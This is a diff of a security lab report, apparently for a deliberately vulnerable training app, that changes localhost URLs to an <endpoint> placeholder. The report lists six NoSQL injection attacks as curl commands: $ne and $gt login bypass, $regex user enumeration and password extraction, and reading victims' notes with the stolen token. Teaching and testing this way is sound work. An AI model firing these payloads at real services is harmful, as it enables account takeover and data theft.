@@ -62,8 +62,12 @@ The frontend source code reveals all endpoints:
 
 ## 3 Ways to Perform the Attacks
 
+Note: This report uses <endpoint> as a placeholder for the backend base URL
+(scheme, host, and port). Replace <endpoint> with the actual deployment address
+when running the examples.
+
 ### Method 1: Frontend Attack Panel
-Open http://localhost:3000/attack.html — a dedicated page with clickable buttons for each attack.
+Open <endpoint>/attack.html — a dedicated page with clickable buttons for each attack.
 
 ### Method 2: Postman
 1. Open Postman → Import → select `NoSQL_Injection_Attacks.postman_collection.json` from the project root
@@ -77,7 +81,7 @@ Open http://localhost:3000/attack.html — a dedicated page with clickable butto
 ### Attack 1: Bypass Password with `$ne` (Not Equal)
 Login as `admin` without knowing the password:
 ```
-curl -s http://localhost:3000/api/auth/login ^
+curl -s <endpoint>/api/auth/login ^
   -H "Content-Type: application/json" ^
   -d "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}"
 ```
@@ -88,7 +92,7 @@ curl -s http://localhost:3000/api/auth/login ^
 ### Attack 2: Login as First User with `$gt` (Greater Than)
 Login without knowing ANY credentials:
 ```
-curl -s http://localhost:3000/api/auth/login ^
+curl -s <endpoint>/api/auth/login ^
   -H "Content-Type: application/json" ^
   -d "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}"
 ```
@@ -99,7 +103,7 @@ curl -s http://localhost:3000/api/auth/login ^
 ### Attack 3: Enumerate Users with `$regex`
 Find users whose username starts with "s":
 ```
-curl -s http://localhost:3000/api/auth/login ^
+curl -s <endpoint>/api/auth/login ^
   -H "Content-Type: application/json" ^
   -d "{\"username\":{\"$regex\":\"^s\"},\"password\":{\"$gt\":\"\"}}"
 ```
@@ -110,7 +114,7 @@ curl -s http://localhost:3000/api/auth/login ^
 ### Attack 4: Extract Password Character-by-Character
 Guess password one character at a time using regex:
 ```
-curl -s http://localhost:3000/api/auth/login ^
+curl -s <endpoint>/api/auth/login ^
   -H "Content-Type: application/json" ^
   -d "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}"
 ```
@@ -124,7 +128,7 @@ revealing the full password is `admin123`.
 ### Attack 5: Login as ANY Specific User
 Target `student2` without their password:
 ```
-curl -s http://localhost:3000/api/auth/login ^
+curl -s <endpoint>/api/auth/login ^
   -H "Content-Type: application/json" ^
   -d "{\"username\":\"student2\",\"password\":{\"$ne\":\"wrongpassword\"}}"
 ```
@@ -135,7 +139,7 @@ curl -s http://localhost:3000/api/auth/login ^
 ### Attack 6: Access Stolen User's Notes
 After any successful injection login, use the returned token to access private notes:
 ```
-curl -s http://localhost:3000/api/notes ^
+curl -s <endpoint>/api/notes ^
   -H "Authorization: Bearer <TOKEN_FROM_INJECTION>"
 ```
 
